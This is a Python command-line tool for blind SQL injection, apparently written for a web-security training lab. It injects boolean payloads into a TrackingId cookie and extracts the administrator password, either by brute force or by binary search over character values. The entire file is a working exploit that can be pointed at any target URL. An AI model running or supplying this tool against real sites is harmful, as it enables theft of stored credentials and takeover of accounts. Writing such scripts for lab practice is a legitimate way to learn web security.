#!/usr/bin/env python3
import requests
import urllib3
import argparse
from urllib.parse import quote
import string

# Disable warnings if using proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HttpClient:
    """
    A simple HTTP client that wraps the GET request functionality.
    Manages target URL, proxies, and cookies.
    """
    def __init__(self, target_url: str, proxies: dict = None, cookies: dict = None):
        self.target_url = target_url
        self.proxies = proxies
        self.cookies = cookies or {}

    def send_request(self) -> (str, int):
        try:
            response = requests.get(self.target_url, proxies=self.proxies, cookies=self.cookies, verify=False)
            return response.text, response.status_code
        except Exception as e:
            print(f"Error sending request to {self.target_url}: {e}")
            return "", None

    def update_cookie(self, cookie_name: str, payload: str) -> None:
        """
        Update the specified cookie by appending the payload to its original value.
        """
        self.cookies[cookie_name] = payload


class PayloadBuilder:
    """
    Builds and encodes payloads for different injection scenarios.
    """
    BRUTE_FORCE_LENGTH_PAYLOAD = (
        "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={pass_length})='a"
    )
    BRUTE_FORCE_CRACK_PAYLOAD = (
        "'AND (SELECT SUBSTRING(password,{char_index},1) FROM users WHERE username='administrator')='{char}"
    )
    BINARY_SEARCH_LENGTH_PAYLOAD = (
        "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{value})='a"
    )
    BINARY_SEARCH_CRACK_PAYLOAD = (
    "'AND (SELECT ASCII(SUBSTRING(password,{char_index},1)) FROM users WHERE username='administrator'){operator}{value}--"
    )


    @staticmethod
    def encode(payload: str) -> str:
        return quote(payload)


class BlindSQLInjector:
    """
    Handles the logic of blind SQL injection, providing both brute force and binary search methods.
    """
    def __init__(self, http_client: HttpClient, injection_cookie: str):
        self.http_client = http_client
        self.injection_cookie = injection_cookie
        # Store the original cookie value so it won't be overwritten by subsequent payloads.
        self.base_cookie_value = http_client.cookies.get(injection_cookie, "")
        self.wordlist = string.ascii_letters + string.digits

    def _check_response(self, response: (str, int), keyword: str = "Welcome back!") -> bool:
        text, status = response
        return status == 200 and (keyword in text)

    def brute_force_find_length(self, max_length: int = 50) -> int:
        for length in range(1, max_length + 1):
            payload = PayloadBuilder.BRUTE_FORCE_LENGTH_PAYLOAD.format(pass_length=length)
            encoded_payload = PayloadBuilder.encode(payload)
            # Always use the stored base cookie value
            self.http_client.update_cookie(self.injection_cookie, self.base_cookie_value + encoded_payload)
            response = self.http_client.send_request()
            if self._check_response(response):
                print(f"[Brute Force] Password length found: {length}")
                return length
            else:
                print(f"[Brute Force] Trying length: {length}", end="\r")
        return 0

    def brute_force_crack_password(self, password_length: int) -> str:
        password_chars = []
        for pos in range(1, password_length + 1):
            for char in self.wordlist:
                payload = PayloadBuilder.BRUTE_FORCE_CRACK_PAYLOAD.format(char_index=pos, char=char)
                encoded_payload = PayloadBuilder.encode(payload)
                self.http_client.update_cookie(self.injection_cookie, self.base_cookie_value + encoded_payload)
                response = self.http_client.send_request()
                if self._check_response(response):
                    password_chars.append(char)
                    print(f"[Brute Force] Found character at position {pos}: {char}")
                    break
                else:
                    print(f"[Brute Force] Trying character '{char}' at position {pos}", end="\r")
        return "".join(password_chars)

    def _binary_search_send(self, payload_template: str, operator: str, test_value: int, char_index: int = None) -> bool:
        if char_index is not None:
            payload = payload_template.format(operator=operator, value=test_value, char_index=char_index)
        else:
            payload = payload_template.format(operator=operator, value=test_value)
        encoded_payload = PayloadBuilder.encode(payload)
        self.http_client.update_cookie(self.injection_cookie, self.base_cookie_value + encoded_payload)
        response = self.http_client.send_request()
        return self._check_response(response)

    def binary_find_length(self, max_password_size: int) -> int:
        low, high = 1, max_password_size  # start at 1
        while low <= high:
            mid = low + (high - low) // 2
            if self._binary_search_send(PayloadBuilder.BINARY_SEARCH_LENGTH_PAYLOAD, "=", mid):
                print(f"[Binary Search] Password length is: {mid}")
                return mid
            elif self._binary_search_send(PayloadBuilder.BINARY_SEARCH_LENGTH_PAYLOAD, ">", mid):
                low = mid + 1
                print(f"[Binary Search] Password length is greater than: {mid}")
            else:
                high = mid - 1
                print(f"[Binary Search] Password length is less than: {mid}")
        print("[Binary Search] No valid password length found in given range.")
        return 0

    def binary_crack_password(self, password_length: int) -> str:
        password_chars = []
        for pos in range(1, password_length + 1):
            low, high = 0, 127  # ASCII range for printable characters
            found_char = False
            while low <= high:
                mid = low + (high - low) // 2
                if self._binary_search_send(PayloadBuilder.BINARY_SEARCH_CRACK_PAYLOAD, "=", mid, char_index=pos):
                    print(f"[Binary Search] Found ASCII value at position {pos}: {mid}")
                    password_chars.append(chr(mid))
                    found_char = True
                    break
                elif self._binary_search_send(PayloadBuilder.BINARY_SEARCH_CRACK_PAYLOAD, ">", mid, char_index=pos):
                    low = mid + 1
                    print(f"[Binary Search] ASCII value at position {pos} is greater than: {mid}")
                else:
                    high = mid - 1
                    print(f"[Binary Search] ASCII value at position {pos} is less than: {mid}")
            if not found_char:
                # No character was found at this position; assume we've reached the end of the password.
                print(f"[Binary Search] No character found at position {pos}, assuming end of password.")
                break
            print(f"[Binary Search] Finished processing position {pos}")
        return "".join(password_chars)

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Blind SQL Injection Tool with Brute Force and Binary Search methods."
    )
    parser.add_argument(
        "target_url",
        type=str,
        help="Target URL of the vulnerable web application."
    )
    parser.add_argument(
        "mode",
        type=str,
        choices=["length", "crack", "binaryLength", "binaryCrack"],
        help=(
            "Operation mode:\n"
            "  length       - Brute force discovery of password length.\n"
            "  crack        - Brute force password cracking (requires password length).\n"
            "  binaryLength - Binary search discovery of password length.\n"
            "  binaryCrack  - Binary search password cracking (requires password length)."
        )
    )
    parser.add_argument(
        "value",
        type=int,
        help="An integer value: maximum length for discovery or known password length for cracking."
    )
    parser.add_argument(
        "--cookie-name",
        type=str,
        default="TrackingId",
        help="Name of the cookie parameter to inject the SQL payload (default: TrackingId)."
    )
    parser.add_argument(
        "--session-cookie",
        type=str,
        default="q2PcNJuq1RRjKBay67viBiWItpJpOPtX",
        help="Session cookie value (default provided for the lab)."
    )
    parser.add_argument(
        "--tracking-cookie",
        type=str,
        default="fjcZd4FG3Q54g3al",
        help="Tracking cookie value (default provided for the lab)."
    )
    parser.add_argument(
        "--proxy",
        type=str,
        default=None,
        help="Optional proxy URL (e.g., http://127.0.0.1:8080)."
    )
    return parser.parse_args()


def main():
    args = parse_arguments()

    # Set up cookies using provided arguments
    site_cookies = {
        args.cookie_name: args.tracking_cookie,
        'session': args.session_cookie
    }

    # Setup proxies if provided
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy,
        }

    client = HttpClient(args.target_url, proxies=proxies, cookies=site_cookies)
    injector = BlindSQLInjector(http_client=client, injection_cookie=args.cookie_name)

    if args.mode == "length":
        length_found = injector.brute_force_find_length(max_length=args.value)
        print(f"Brute Force: Password length is {length_found}")
    elif args.mode == "crack":
        password = injector.brute_force_crack_password(password_length=args.value)
        print(f"Brute Force: Password is {password}")
    elif args.mode == "binaryLength":
        length_found = injector.binary_find_length(max_password_size=args.value)
        print(f"Binary Search: Password length is {length_found}")
    elif args.mode == "binaryCrack":
        password = injector.binary_crack_password(password_length=args.value)
        print(f"Binary Search: Password is {password}")
    else:
        print("Invalid mode selected.")


if __name__ == '__main__':
    main()
